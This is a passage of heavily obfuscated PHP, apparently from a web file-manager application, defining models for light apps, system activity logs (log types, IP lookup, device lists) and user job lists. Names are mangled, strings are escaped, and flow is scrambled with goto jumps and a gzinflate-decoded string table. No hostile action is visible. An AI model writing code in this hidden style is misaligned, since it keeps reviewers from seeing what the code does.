$Fíñ‚Ñ±¢¢ = "\173\x69\x6f\x3a{$BöÌ†Ã®³¹}\175\x2f"; $fÜô¨Î†ê¨ = array($D¶ÁïÈ–±ù[387] => 0, $D¶ÁïÈ–±ù[1050] => array($D¶ÁïÈ–±ù[375], "{$Fíñ‚Ñ±¢¢}\45")); goto E»Â‡£ë–; CŞˆÊØ’º: Model($D¶ÁïÈ–±ù[552])->remove($Dİ˜Á®Æ•); goto c‚‰‹¼è°; c‚‰‹¼è°: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\114\x69\x67\150\164\x41\160\x70"; public $modelType = "\x53\x79\x73\164\x65\155\117\x70\164\151\157\156"; public $field = array("\156\x61\x6d\145", "\147\x72\x6f\x75\x70", "\x64\x65\163\x63", "\x63\157\x6e\x74\145\156\164"); public function listData($a†¦Ä‹º„× = false, $e†¬œÒÛ¶Š = "\x6d\157\x64\151\146\x79\124\151\x6d\145", $Aª¸–»İš = true) { return parent::listData($a†¦Ä‹º„×, $e†¬œÒÛ¶Š, $Aª¸–»İš); } public function remove($bã­“Â·±ò) { $AŞø¯´‹ˆÅ = $this->findByName($bã­“Â·±ò); if (!$AŞø¯´‹ˆÅ) { return !1; } return parent::remove($AŞø¯´‹ˆÅ[$_SERVER[Æ¼ôºÙï][385]]); } public function add($b”ó›Î”¤«) { if ($this->findByName($b”ó›Î”¤«[$_SERVER[Æ¼ôºÙï][28]])) { return !1; } return parent::insert($b”ó›Î”¤«); } public function update($dÕéÙë‰†, $AÍÂîåÏ…Ò) { $E§ó‘àã‹ =& $_SERVER[Æ¼ôºÙï]; $AÁô²Ğª†˜ = $this->findByName($dÕéÙë‰†); $BŞè¸‡¦ò = $this->findByName($AÍÂîåÏ…Ò[$E§ó‘àã‹[28]]); if (!$AÁô²Ğª†˜ || $BŞè¸‡¦ò && $BŞè¸‡¦ò[$E§ó‘àã‹[385]] != $AÁô²Ğª†˜[$E§ó‘àã‹[385]]) { return !1; } return parent::update($AÁô²Ğª†˜[$E§ó‘àã‹[385]], $AÍÂîåÏ…Ò); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\x65\x6d\137\154\157\147"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\124\x69\x6d\x65", "\164\x69\155\x65", "\151\x6e\x73\145\x72\x74", "\146\x75\x6e\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $D¾±»ÏÆÔÁ =& $_SERVER[Æ¼ôºÙï]; return array($D¾±»ÏÆÔÁ[1972] => LNG($D¾±»ÏÆÔÁ[1973]), $D¾±»ÏÆÔÁ[1974] => LNG($D¾±»ÏÆÔÁ[1975]), $D¾±»ÏÆÔÁ[1600] => LNG($D¾±»ÏÆÔÁ[1976]), $D¾±»ÏÆÔÁ[1977] => LNG($D¾±»ÏÆÔÁ[1978]), $D¾±»ÏÆÔÁ[1979] => LNG($D¾±»ÏÆÔÁ[1980]), $D¾±»ÏÆÔÁ[1981] => LNG($D¾±»ÏÆÔÁ[1982]), $D¾±»ÏÆÔÁ[1983] => LNG($D¾±»ÏÆÔÁ[1984]), $D¾±»ÏÆÔÁ[1631] => LNG($D¾±»ÏÆÔÁ[1984]), $D¾±»ÏÆÔÁ[1632] => LNG($D¾±»ÏÆÔÁ[1985]), $D¾±»ÏÆÔÁ[1986] => LNG($D¾±»ÏÆÔÁ[1987]), $D¾±»ÏÆÔÁ[1988] => LNG($D¾±»ÏÆÔÁ[1989]), $D¾±»ÏÆÔÁ[1990] => LNG($D¾±»ÏÆÔÁ[1991]), $D¾±»ÏÆÔÁ[1992] => LNG($D¾±»ÏÆÔÁ[1993]), $D¾±»ÏÆÔÁ[1629] => LNG($D¾±»ÏÆÔÁ[1994]), $D¾±»ÏÆÔÁ[1636] => LNG($D¾±»ÏÆÔÁ[1995]), $D¾±»ÏÆÔÁ[1996] => LNG($D¾±»ÏÆÔÁ[1997]), $D¾±»ÏÆÔÁ[1998] => LNG($D¾±»ÏÆÔÁ[1999]), $D¾±»ÏÆÔÁ[2000] => LNG($D¾±»ÏÆÔÁ[2001]), $D¾±»ÏÆÔÁ[2002] => LNG($D¾±»ÏÆÔÁ[2003]), $D¾±»ÏÆÔÁ[1639] => LNG($D¾±»ÏÆÔÁ[2004]), $D¾±»ÏÆÔÁ[1640] => LNG($D¾±»ÏÆÔÁ[2005]), $D¾±»ÏÆÔÁ[2006] => LNG($D¾±»ÏÆÔÁ[2007]), $D¾±»ÏÆÔÁ[2008] => LNG($D¾±»ÏÆÔÁ[2009]), $D¾±»ÏÆÔÁ[2010] => LNG($D¾±»ÏÆÔÁ[2011]), $D¾±»ÏÆÔÁ[1634] => LNG($D¾±»ÏÆÔÁ[2012]), $D¾±»ÏÆÔÁ[2013] => LNG($D¾±»ÏÆÔÁ[2014]), $D¾±»ÏÆÔÁ[1633] => LNG($D¾±»ÏÆÔÁ[2015]), $D¾±»ÏÆÔÁ[2016] => LNG($D¾±»ÏÆÔÁ[2017]), $D¾±»ÏÆÔÁ[2018] => LNG($D¾±»ÏÆÔÁ[2019]), $D¾±»ÏÆÔÁ[2020] => LNG($D¾±»ÏÆÔÁ[2020]), $D¾±»ÏÆÔÁ[2021] => LNG($D¾±»ÏÆÔÁ[1604]), $D¾±»ÏÆÔÁ[2022] => LNG($D¾±»ÏÆÔÁ[2023]), $D¾±»ÏÆÔÁ[2024] => LNG($D¾±»ÏÆÔÁ[2025]), $D¾±»ÏÆÔÁ[2026] => LNG($D¾±»ÏÆÔÁ[2027]), $D¾±»ÏÆÔÁ[2028] => LNG($D¾±»ÏÆÔÁ[2029]), $D¾±»ÏÆÔÁ[2030] => LNG($D¾±»ÏÆÔÁ[2031]), $D¾±»ÏÆÔÁ[2032] => LNG($D¾±»ÏÆÔÁ[2032]), $D¾±»ÏÆÔÁ[2033] => LNG($D¾±»ÏÆÔÁ[2034]), $D¾±»ÏÆÔÁ[2035] => LNG($D¾±»ÏÆÔÁ[2036]), $D¾±»ÏÆÔÁ[2037] => LNG($D¾±»ÏÆÔÁ[2038]), $D¾±»ÏÆÔÁ[2039] => LNG($D¾±»ÏÆÔÁ[2040]), $D¾±»ÏÆÔÁ[2041] => LNG($D¾±»ÏÆÔÁ[2042]), $D¾±»ÏÆÔÁ[2043] => LNG($D¾±»ÏÆÔÁ[2044])); } private function typeFile() { $Aì—Œ¬ùÙ =& $_SERVER[Æ¼ôºÙï]; $D›ßÙ‰š†Ú = array($Aì—Œ¬ùÙ[1636] => array($Aì—Œ¬ùÙ[1637]), $Aì—Œ¬ùÙ[1990] => array($Aì—Œ¬ùÙ[2045]), $Aì—Œ¬ùÙ[1992] => array($Aì—Œ¬ùÙ[2046]), $Aì—Œ¬ùÙ[1629] => array($Aì—Œ¬ùÙ[1630]), $Aì—Œ¬ùÙ[1998] => array(), $Aì—Œ¬ùÙ[2000] => array(), $Aì—Œ¬ùÙ[2002] => array(), $Aì—Œ¬ùÙ[1639] => array($Aì—Œ¬ùÙ[1641]), $Aì—Œ¬ùÙ[1640] => array($Aì—Œ¬ùÙ[1641]), $Aì—Œ¬ùÙ[2006] => array($Aì—Œ¬ùÙ[2047]), $Aì—Œ¬ùÙ[2008] => array($Aì—Œ¬ùÙ[2047]), $Aì—Œ¬ùÙ[2010] => array($Aì—Œ¬ùÙ[2048]), $Aì—Œ¬ùÙ[1996] => array($Aì—Œ¬ùÙ[2049]), $Aì—Œ¬ùÙ[1634] => array($Aì—Œ¬ùÙ[2050]), $Aì—Œ¬ùÙ[2013] => array($Aì—Œ¬ùÙ[2051]), $Aì—Œ¬ùÙ[1633] => array($Aì—Œ¬ùÙ[1635])); return $D›ßÙ‰š†Ú; } private function typeAll() { goto d›ïğÄâò¨; B¤·ìîŞ±: return $dÏõÊâÂù„; goto dŠ„‹Ì×ÖÉ; EÍ×”Ÿïä³: foreach ($b¼´¥Ó‹Ë† as $fŠâ‰ìÆË => $eİ„İÎÁò½) { $dÏõÊâÂù„[$eİ„İÎÁò½[0]] = $dÏõÊâÂù„[$fŠâ‰ìÆË]; } $dÏõÊâÂù„[$bÉ‚™êôÛ[1641]] = LNG($bÉ‚™êôÛ[2052]); $dÏõÊâÂù„[$bÉ‚™êôÛ[2047]] = LNG($bÉ‚™êôÛ[2053]); goto B¤·ìîŞ±; d›ïğÄâò¨: $bÉ‚™êôÛ =& $_SERVER[Æ¼ôºÙï]; $dÏõÊâÂù„ = $this->typeList; $b¼´¥Ó‹Ë† = array_filter($this->typeFile()); goto EÍ×”Ÿïä³; dŠ„‹Ì×ÖÉ: } public function addLog($eÀ®îÊ–®, $Eƒ¸¾ö»å = array()) { goto Bòéíº£Œí; F»µ¡á“Œ: $Eƒ¸¾ö»å = array($DÂ‰øÉâÌ[1493] => Session::sign(), $DÂ‰øÉâÌ[1494] => $E…Æ‘Ş¸¥‚, $DÂ‰øÉâÌ[29] => $eÀ®îÊ–®, $DÂ‰øÉâÌ[1496] => json_encode($Eƒ¸¾ö»å)); parent::add($Eƒ¸¾ö»å); goto aÄ½µ®£˜ã; DøÒ ù‰ : if (!$E…Æ‘Ş¸¥‚) { $E…Æ‘Ş¸¥‚ = (int) Session::get($DÂ‰øÉâÌ[1786]); } $bêç °•çÈ = get_client_ip(); if (!$Eƒ¸¾ö»å || strlen(json_encode($Eƒ¸¾ö»å)) >= 1024) { $Eƒ¸¾ö»å = array($DÂ‰øÉâÌ[2054] => $bêç °•çÈ); } else { if (is_array($Eƒ¸¾ö»å)) { $Eƒ¸¾ö»å[$DÂ‰øÉâÌ[2054]] = $bêç °•çÈ; } else { $Eƒ¸¾ö»å = array($DÂ‰øÉâÌ[1067] => $Eƒ¸¾ö»å, $DÂ‰øÉâÌ[2054] => $bêç °•çÈ); } } goto F»µ¡á“Œ; Bòéíº£Œí: $DÂ‰øÉâÌ =& $_SERVER[Æ¼ôºÙï]; if (!isset($this->typeList[$eÀ®îÊ–®])) { return; } $E…Æ‘Ş¸¥‚ = defined($DÂ‰øÉâÌ[443]) && USER_ID ? USER_ID : (isset($Eƒ¸¾ö»å[$DÂ‰øÉâÌ[1502]]) ? $Eƒ¸¾ö»å[$DÂ‰øÉâÌ[1502]] : 0); goto DøÒ ù‰ ; aÄ½µ®£˜ã: } public function remove($EÔŸÂ‘š•‘) { $this->where(array($_SERVER[Æ¼ôºÙï][403] => $EÔŸÂ‘š•‘))->delete(); } private function _makeOrder($BÈìšó”…ğ = '') { goto AÈ×‡Ñ‡ò“; fß×¨§ƒèŠ: return $this->order($BÈìšó”…ğ); goto Bğƒ»§İ®; eÖšê³…æ: $A´‰¿†ÌãÔ = Input::get($cã”ĞˆÀôŞ[425], $cã”ĞˆÀôŞ[7], $cã”ĞˆÀôŞ[1821], array($cã”ĞˆÀôŞ[1746], $cã”ĞˆÀôŞ[421])); $A´‰¿†ÌãÔ = $b–ùç¹Ÿ¯–[$A´‰¿†ÌãÔ]; $BÈìšó”…ğ = $BÈìšó”…ğ . "{$bÁå½¯»Œ­}\40{$A´‰¿†ÌãÔ}"; goto fß×¨§ƒèŠ; AÈ×‡Ñ‡ò“: $cã”ĞˆÀôŞ =& $_SERVER[Æ¼ôºÙï]; $bÁå½¯»Œ­ = $cã”ĞˆÀôŞ[192]; $b–ùç¹Ÿ¯– = array($cã”ĞˆÀôŞ[419] => $cã”ĞˆÀôŞ[420], $cã”ĞˆÀôŞ[421] => $cã”ĞˆÀôŞ[422]); goto eÖšê³…æ; Bğƒ»§İ®: } public function get($EÕ³‘‘‡›§ = '') { goto Bš¤ë›ğ”å; Bš¤ë›ğ”å: $DÕ¤ö½¦®Í =& $_SERVER[Æ¼ôºÙï]; if (!$EÕ³‘‘‡›§) { show_json(array()); } $Eë×˜Úå = array(); goto fèÌë«‹ÏÆ; bœ²›êÔì: if (!empty($EÕ³‘‘‡›§[$DÕ¤ö½¦®Í[2054]])) { $Eë×˜Úå[$DÕ¤ö½¦®Í[422]] = array($DÕ¤ö½¦®Í[375], "\45{$EÕ³‘‘‡›§[$DÕ¤ö½¦®Í[2054]]}\x25"); } $dö®ÖĞ›®  = $this->_makeOrder()->where($Eë×˜Úå)->selectPage(); if (empty($dö®ÖĞ›® [$DÕ¤ö½¦®Í[363]])) { show_json(array(), !0, $dö®ÖĞ›® [$DÕ¤ö½¦®Í[360]]); } goto a„á™Ï‰®±; a„á™Ï‰®±: $dö®ÖĞ›® [$DÕ¤ö½¦®Í[363]] = $this->logList($dö®ÖĞ›® [$DÕ¤ö½¦®Í[363]]); return $dö®ÖĞ›® ; goto fë‡Ù™ç‹¸; fèÌë«‹ÏÆ: if ($EÕ³‘‘‡›§[$DÕ¤ö½¦®Í[1502]]) { $Eë×˜Úå[$DÕ¤ö½¦®Í[1502]] = $EÕ³‘‘‡›§[$DÕ¤ö½¦®Í[1502]]; } if (isset($EÕ³‘‘‡›§[$DÕ¤ö½¦®Í[721]])) { $e»µ‚°³¥» = $EÕ³‘‘‡›§[$DÕ¤ö½¦®Í[721]]; $AÒ³ÉêÑ¾ = isset($EÕ³‘‘‡›§[$DÕ¤ö½¦®Í[465]]) ? $EÕ³‘‘‡›§[$DÕ¤ö½¦®Í[465]] : time(); $Eë×˜Úå[$DÕ¤ö½¦®Í[192]] = array($DÕ¤ö½¦®Í[329], array($e»µ‚°³¥», $AÒ³ÉêÑ¾)); } if ($EÕ³‘‘‡›§[$DÕ¤ö½¦®Í[29]]) { $E¤‚…ÑÃ = explode($DÕ¤ö½¦®Í[47], $EÕ³‘‘‡›§[$DÕ¤ö½¦®Í[29]]); $D–‡Ãâæ¤õ = $this->typeFile(); $EÛë‰‘Ç°‰ = array(); foreach ($E¤‚…ÑÃ as $E¦øó¤ºô) { $EÛë‰‘Ç°‰[] = $E¦øó¤ºô; if (isset($D–‡Ãâæ¤õ[$E¦øó¤ºô])) { $EÛë‰‘Ç°‰ = array_merge($EÛë‰‘Ç°‰, $D–‡Ãâæ¤õ[$E¦øó¤ºô]); } } $EÛë‰‘Ç°‰ = array_unique($EÛë‰‘Ç°‰); if ($EÛë‰‘Ç°‰) { $Eë×˜Úå[$DÕ¤ö½¦®Í[29]] = array($DÕ¤ö½¦®Í[7], $EÛë‰‘Ç°‰); } } goto bœ²›êÔì; fë‡Ù™ç‹¸: } private function ipAddress(&$B‚·ñÄÆõ) { $eøóØ‹»ğ¡ =& $_SERVER[Æ¼ôºÙï]; if (!empty($B‚·ñÄÆõ[$eøóØ‹»ğ¡[2054]])) { $bîâæÙ¡ö = IpLocation::get($B‚·ñÄÆõ[$eøóØ‹»ğ¡[2054]]); } else { $bîâæÙ¡ö = LNG($eøóØ‹»ğ¡[2055]); } $B‚·ñÄÆõ[$eøóØ‹»ğ¡[2056]] = $bîâæÙ¡ö; } private function descZipDownload($DÇÌÜÆ©è, &$Aßø„Ú¶†¥) { $C®ƒÄÄ‘ =& $_SERVER[Æ¼ôºÙï]; if (!isset($DÇÌÜÆ©è[$C®ƒÄÄ‘[2057]])) { return; } $Aæë‚öƒó¼ = json_decode($DÇÌÜÆ©è[$C®ƒÄÄ‘[2057]], !0); foreach ($Aæë‚öƒó¼ as $aˆØğ¡ÕŒ) { try { $B¯¼Â³Ğ÷Ò = IO::infoFull($aˆØğ¡ÕŒ[$C®ƒÄÄ‘[75]]); } catch (Exception $F ˜ğ—ÊìÖ) { continue; } $DÇÌÜÆ©è[$C®ƒÄÄ‘[75]] = $aˆØğ¡ÕŒ[$C®ƒÄÄ‘[75]]; $Aßø„Ú¶†¥[] = $DÇÌÜÆ©è[$C®ƒÄÄ‘[387]] = $B¯¼Â³Ğ÷Ò[$C®ƒÄÄ‘[387]]; $Aßø„Ú¶†¥[] = $DÇÌÜÆ©è[$C®ƒÄÄ‘[1876]] = $B¯¼Â³Ğ÷Ò[$C®ƒÄÄ‘[479]]; break; } return $DÇÌÜÆ©è; } private function getSourceList(&$e¯Üçêá¡) { $F¢†‡²†À¡ =& $_SERVER[Æ¼ôºÙï]; $d”òŒ™ˆ¤è = array(); foreach ($e¯Üçêá¡ as $F¸È‡¥Ş›î => $FÄ®ºÔÕÆË) { goto E‹ŠóÈâöÒ; E‹ŠóÈâöÒ: $A­Å¤ß¤Ä = json_decode($FÄ®ºÔÕÆË[$F¢†‡²†À¡[422]], !0); if ($FÄ®ºÔÕÆË[$F¢†‡²†À¡[29]] == $F¢†‡²†À¡[1632]) { $A­Å¤ß¤Ä = $this->descZipDownload($A­Å¤ß¤Ä, $d”òŒ™ˆ¤è); $e¯Üçêá¡[$F¸È‡¥Ş›î][$F¢†‡²†À¡[422]] = json_encode($A­Å¤ß¤Ä); continue; } if (strpos($FÄ®ºÔÕÆË[$F¢†‡²†À¡[29]], $F¢†‡²†À¡[1877]) !== 0) { if (!isset($A­Å¤ß¤Ä[$F¢†‡²†À¡[75]]) || strpos($FÄ®ºÔÕÆË[$F¢†‡²†À¡[29]], $F¢†‡²†À¡[2058]) !== 0) { continue; } try { $b„ùĞ˜£¦– = IO::infoFull($A­Å¤ß¤Ä[$F¢†‡²†À¡[75]]); } catch (Exception $aßõ±ä¢õ¤) { continue; } $d”òŒ™ˆ¤è[] = $A­Å¤ß¤Ä[$F¢†‡²†À¡[387]] = $b„ùĞ˜£¦–[$F¢†‡²†À¡[387]]; $d”òŒ™ˆ¤è[] = $A­Å¤ß¤Ä[$F¢†‡²†À¡[1876]] = $b„ùĞ˜£¦–[$F¢†‡²†À¡[479]]; $e¯Üçêá¡[$F¸È‡¥Ş›î][$F¢†‡²†À¡[422]] = json_encode($A­Å¤ß¤Ä); continue; } goto cĞºíî•§©; cĞºíî•§©: $d”òŒ™ˆ¤è[] = $A­Å¤ß¤Ä[$F¢†‡²†À¡[387]]; $d”òŒ™ˆ¤è[] = $A­Å¤ß¤Ä[$F¢†‡²†À¡[1876]]; if ($A­Å¤ß¤Ä[$F¢†‡²†À¡[29]] == $F¢†‡²†À¡[509]) { $d”òŒ™ˆ¤è[] = $A­Å¤ß¤Ä[$F¢†‡²†À¡[422]][$F¢†‡²†À¡[1034]]; $d”òŒ™ˆ¤è[] = $A­Å¤ß¤Ä[$F¢†‡²†À¡[422]][$F¢†‡²†À¡[1035]]; } goto f³š¤‚Å„ğ; f³š¤‚Å„ğ: if ($A­Å¤ß¤Ä[$F¢†‡²†À¡[29]] == $F¢†‡²†À¡[1884]) { $d”òŒ™ˆ¤è[] = $A­Å¤ß¤Ä[$F¢†‡²†À¡[422]][$F¢†‡²†À¡[387]]; } goto A»¾êÖâ°”; A»¾êÖâ°”: } if (!$d”òŒ™ˆ¤è) { return array(); } return Model($F¢†‡²†À¡[770])->sourceListInfo($d”òŒ™ˆ¤è, !0); } private function logList($a£Š³ÑøÅÓ) { goto fÁâ¿ÇĞƒÙ; Eˆ£‚‚µÆ: $DËƒùĞ©ëŸ = array(); foreach ($a£Š³ÑøÅÓ as $eÃ×•²½º => $C¥ñ¾®¨ùÎ) { goto BÛÙñéÀ°Æ; BÛÙñéÀ°Æ: $DÎŒÚˆ§¶Ï = $C¥ñ¾®¨ùÎ[$a«œŞì–õ´[29]]; $dõÚ¾îÄÂ = isset($a— …È×ì[$C¥ñ¾®¨ùÎ[$a«œŞì–õ´[1502]]]) ? $a— …È×ì[$C¥ñ¾®¨ùÎ[$a«œŞì–õ´[1502]]] : !1; $AÏâÏùß²¶ = strpos($DÎŒÚˆ§¶Ï, $a«œŞì–õ´[2059]) === 0 ? LNG($a«œŞì–õ´[2060]) : LNG($a«œŞì–õ´[2055]); goto A»ÁÏóîÖ ; B¬ Æ³íæ: $this->ipAddress($C¥ñ¾®¨ùÎ); if (strpos($DÎŒÚˆ§¶Ï, $a«œŞì–õ´[1877]) === 0 || isset($e†“„ÙˆÌ[$a«œŞì–õ´[1876]])) { goto fÄÃİã†‹µ; aÊŠÔŒàÅÇ: if ($e†“„ÙˆÌ[$a«œŞì–õ´[29]] == $a«œŞì–õ´[1884]) { $e†“„ÙˆÌ[$a«œŞì–õ´[422]][$a«œŞì–õ´[387]] = $C†„¼¬ÁØŒ[$e†“„ÙˆÌ[$a«œŞì–õ´[422]][$a«œŞì–õ´[387]]]; } if ($e†“„ÙˆÌ[$a«œŞì–õ´[29]] == $a«œŞì–õ´[1627]) { $e†“„ÙˆÌ[$a«œŞì–õ´[1889]] = $e†“„ÙˆÌ[$a«œŞì–õ´[84]]; $e†“„ÙˆÌ[$a«œŞì–õ´[1876]] = $e†“„ÙˆÌ[$a«œŞì–õ´[1889]][$a«œŞì–õ´[387]]; $e†“„ÙˆÌ[$a«œŞì–õ´[84]] = !1; $e†“„ÙˆÌ[$a«œŞì–õ´[387]] = $a«œŞì–õ´[33]; } if ($e†“„ÙˆÌ[$a«œŞì–õ´[84]] && $e†“„ÙˆÌ[$a«œŞì–õ´[84]][$a«œŞì–õ´[389]] == $a«œŞì–õ´[1146]) { $DËƒùĞ©ëŸ[] = $C¥ñ¾®¨ùÎ[$a«œŞì–õ´[385]]; unset($a£Š³ÑøÅÓ[$eÃ×•²½º]); continue; } goto dÁöÌßĞ…‡; fÄÃİã†‹µ: $e†“„ÙˆÌ[$a«œŞì–õ´[84]] = $C†„¼¬ÁØŒ[$e†“„ÙˆÌ[$a«œŞì–õ´[387]]]; $e†“„ÙˆÌ[$a«œŞì–õ´[1889]] = $C†„¼¬ÁØŒ[$e†“„ÙˆÌ[$a«œŞì–õ´[1876]]]; if ($e†“„ÙˆÌ[$a«œŞì–õ´[29]] == $a«œŞì–õ´[509]) { $e†“„ÙˆÌ[$a«œŞì–õ´[422]][$a«œŞì–õ´[1034]] = $C†„¼¬ÁØŒ[$e†“„ÙˆÌ[$a«œŞì–õ´[422]][$a«œŞì–õ´[1034]]]; $e†“„ÙˆÌ[$a«œŞì–õ´[422]][$a«œŞì–õ´[1035]] = $C†„¼¬ÁØŒ[$e†“„ÙˆÌ[$a«œŞì–õ´[422]][$a«œŞì–õ´[1035]]]; } goto aÊŠÔŒàÅÇ; dÁöÌßĞ…‡: if ($e†“„ÙˆÌ[$a«œŞì–õ´[1889]] && $e†“„ÙˆÌ[$a«œŞì–õ´[1889]][$a«œŞì–õ´[389]] == $a«œŞì–õ´[1146]) { $DËƒùĞ©ëŸ[] = $C¥ñ¾®¨ùÎ[$a«œŞì–õ´[385]]; unset($a£Š³ÑøÅÓ[$eÃ×•²½º]); continue; } goto e·´ßÙ¤È; e·´ßÙ¤È: } $C¥ñ¾®¨ùÎ[$a«œŞì–õ´[422]] = $e†“„ÙˆÌ; goto A²Ñã¨Òˆç; CŞµË°ÀÄ¹: $C¥ñ¾®¨ùÎ[$a«œŞì–õ´[1820]] = $dõÚ¾îÄÂ; $e†“„ÙˆÌ = json_decode($C¥ñ¾®¨ùÎ[$a«œŞì–õ´[422]], !0); $C¥ñ¾®¨ùÎ[$a«œŞì–õ´[2054]] = isset($e†“„ÙˆÌ[$a«œŞì–õ´[2054]]) ? $e†“„ÙˆÌ[$a«œŞì–õ´[2054]] : $a«œŞì–õ´[33]; goto B¬ Æ³íæ; A»ÁÏóîÖ : $C¥ñ¾®¨ùÎ[$a«œŞì–õ´[28]] = isset($dõÚ¾îÄÂ[$a«œŞì–õ´[28]]) ? $dõÚ¾îÄÂ[$a«œŞì–õ´[28]] : LNG($a«œŞì–õ´[2055]); $C¥ñ¾®¨ùÎ[$a«œŞì–õ´[1926]] = isset($dõÚ¾îÄÂ[$a«œŞì–õ´[1926]]) ? $dõÚ¾îÄÂ[$a«œŞì–õ´[1926]] : $a«œŞì–õ´[33]; $C¥ñ¾®¨ùÎ[$a«œŞì–õ´[1407]] = isset($a¢·Â„ö–[$DÎŒÚˆ§¶Ï]) ? $a¢·Â„ö–[$DÎŒÚˆ§¶Ï] : $AÏâÏùß²¶; goto CŞµË°ÀÄ¹; A²Ñã¨Òˆç: unset($C¥ñ¾®¨ùÎ[$a«œŞì–õ´[2061]]); $FÖ—´²Ã¸§[] = $C¥ñ¾®¨ùÎ; goto D„ë‹±ğ×‰; D„ë‹±ğ×‰: } $this->clearSystemPathLog($DËƒùĞ©ëŸ); goto E¦÷³º¥²»; c†åÂ±øõ‡: $C†„¼¬ÁØŒ = $this->getSourceList($a£Š³ÑøÅÓ); $a¢·Â„ö– = $this->typeAll(); $FÖ—´²Ã¸§ = array(); goto Eˆ£‚‚µÆ; fÁâ¿ÇĞƒÙ: $a«œŞì–õ´ =& $_SERVER[Æ¼ôºÙï]; $c–‰öªò„ = array_to_keyvalue($a£Š³ÑøÅÓ, $a«œŞì–õ´[33], $a«œŞì–õ´[1502]); $a— …È×ì = Model($a«œŞì–õ´[495])->userListInfo(array_unique($c–‰öªò„)); goto c†åÂ±øõ‡; E¦÷³º¥²»: return $FÖ—´²Ã¸§; goto Eì­ˆš·‰; Eì­ˆš·‰: } private function clearSystemPathLog($a²Èİ¡¿Ö) { $bÎ”©Ä†Ç =& $_SERVER[Æ¼ôºÙï]; if (count($a²Èİ¡¿Ö) == 0) { return; } $e‰¸ĞÏ°Ëİ = array($bÎ”©Ä†Ç[385] => array($bÎ”©Ä†Ç[7], array_unique($a²Èİ¡¿Ö))); $this->where($e‰¸ĞÏ°Ëİ)->delete(); } public function deviceList($fÊ¿©Ñ±Äß, $bÊ™ä‰âò = 0) { $eÈ„ô“—¦Ÿ =& $_SERVER[Æ¼ôºÙï]; $D¯‰èĞ•ê– = array($eÈ„ô“—¦Ÿ[1502] => $fÊ¿©Ñ±Äß, $eÈ„ô“—¦Ÿ[192] => array($eÈ„ô“—¦Ÿ[950], $bÊ™ä‰âò), $eÈ„ô“—¦Ÿ[29] => $eÈ„ô“—¦Ÿ[1600]); $dƒ‘¼ºÍŸœ = array(); $eğ³Œ’Öà‚ = $this->field($eÈ„ô“—¦Ÿ[2062])->where($D¯‰èĞ•ê–)->order($eÈ„ô“—¦Ÿ[1887])->limit(50)->select(); foreach ($eğ³Œ’Öà‚ as $dù‰õì¦†µ => $aÑ©°Ã‰) { goto BòçŸŒ‚Ê÷; BòçŸŒ‚Ê÷: if ($dù‰õì¦†µ > 0 && abs($aÑ©°Ã‰[$eÈ„ô“—¦Ÿ[192]] - $eğ³Œ’Öà‚[$dù‰õì¦†µ - 1][$eÈ„ô“—¦Ÿ[192]]) < 5) { continue; } $FÛ±áøÕ…Ÿ = json_decode($aÑ©°Ã‰[$eÈ„ô“—¦Ÿ[422]], !0); $aÑ©°Ã‰[$eÈ„ô“—¦Ÿ[2054]] = isset($FÛ±áøÕ…Ÿ[$eÈ„ô“—¦Ÿ[2054]]) ? $FÛ±áøÕ…Ÿ[$eÈ„ô“—¦Ÿ[2054]] : $eÈ„ô“—¦Ÿ[33]; goto b™‹òÎÒïÌ; aÚ‘›Úƒ†›: $this->ipAddress($aÑ©°Ã‰); $aÑ©°Ã‰[$eÈ„ô“—¦Ÿ[422]] = $FÛ±áøÕ…Ÿ; $dƒ‘¼ºÍŸœ[$BµÅŠÎæœ] = $aÑ©°Ã‰; goto f£ëæ¡£; b™‹òÎÒïÌ: unset($FÛ±áøÕ…Ÿ[$eÈ„ô“—¦Ÿ[2054]]); $BµÅŠÎæœ = $this->deviceType($FÛ±áøÕ…Ÿ[$eÈ„ô“—¦Ÿ[1878]]); if (isset($dƒ‘¼ºÍŸœ[$BµÅŠÎæœ])) { continue; } goto aÚ‘›Úƒ†›; f£ëæ¡£: } return array_values($dƒ‘¼ºÍŸœ); } public function deviceType($DÈ†µøš»¸) { return $DÈ†µøš»¸; } } goto BĞ¸‡—íÔ; dåˆÄ’Á¯Û: define($_SERVER[Æ¼ôºÙï][0], $_SERVER[Æ¼ôºÙï][1]); $_SERVER[Î] = explode($_SERVER[Æ¼ôºÙï][2], gzinflate(substr($_SERVER[Æ¼ôºÙï][3], 10, -8))); function binCheckEq($cÙÆòÚšñÛ, $FÇßİæÔÚì) { return $cÙÆòÚšñÛ == $FÇßİæÔÚì; } goto cåï•É‹°; Dá†ğÌÜ—È: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\x2e\152\x6f\142\114\151\x73\164"; public $field = array("\156\x61\155\145", "\x64\145\x73\x63", "\163\x6f\x72\x74"); const JOB_KEY = "\x73\x65\154\x66\112\157\142\x4c\151\163\x74"; public function listData($E¡‡Ñõé¹… = false, $bĞÕ†­±ˆå = "\163\x6f\162\x74", $e‹İÈĞëå° = false) { return parent::listData($E¡‡Ñõé¹…, $bĞÕ†­±ˆå, $e‹İÈĞëå°); } public function remove($Eîããˆ¥ˆ) { return parent::remove($Eîããˆ¥ˆ); } public function add($CÓ ğŸŒå“) { $b¾àõİ¡î =& $_SERVER[Æ¼ôºÙï]; if ($this->findByName($CÓ ğŸŒå“[$b¾àõİ¡î[28]])) { return !1; } $CÓ ğŸŒå“[$b¾àõİ¡î[1684]] = $this->getSort(); return parent::insert($CÓ ğŸŒå“); } private function getSort() { $AŞ£®ù¤ =& $_SERVER[Æ¼ôºÙï]; $cÈµÓÂé„à = parent::listData(); $e´á®æÊµ§ = array_to_keyvalue($cÈµÓÂé„à, $AŞ£®ù¤[33], $AŞ£®ù¤[1684]); return empty($e´á®æÊµ§) ? 0 : max($e´á®æÊµ§) + 1; } public function update($D¼¥ºÅ™ôî, $Fİ—’„•×) { $B¡½®Øš×Ù =& $_SERVER[Æ¼ôºÙï]; $eÑÄÌ¸£ = parent::listData($D¼¥ºÅ™ôî); $D™šùì½ù„ = $this->findByName($Fİ—’„•×[$B¡½®Øš×Ù[28]]); if (!$eÑÄÌ¸£ || $D™šùì½ù„ && $D™šùì½ù„[$B¡½®Øš×Ù[385]] != $eÑÄÌ¸£[$B¡½®Øš×Ù[385]]) { return !1; } return parent::update($D¼¥ºÅ™ôî, 